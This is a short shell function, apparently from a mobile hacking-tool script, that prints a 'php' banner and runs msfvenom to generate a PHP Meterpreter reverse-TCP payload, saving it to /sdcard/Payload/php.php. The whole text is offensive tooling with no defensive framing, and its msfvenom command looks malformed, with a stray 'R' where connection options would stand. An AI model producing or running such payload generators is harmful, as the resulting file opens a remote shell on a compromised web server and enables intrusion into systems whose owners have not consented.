p() {
	clear
	echo -e "\033[1;92m"
	figlet php
	echo
	printf "\n Please wait.."
	msfvenom -p php/meterpreter/reverse_tcp R > /sdcard/Payload/php.php
	printf "\n Completed\n\n"
	}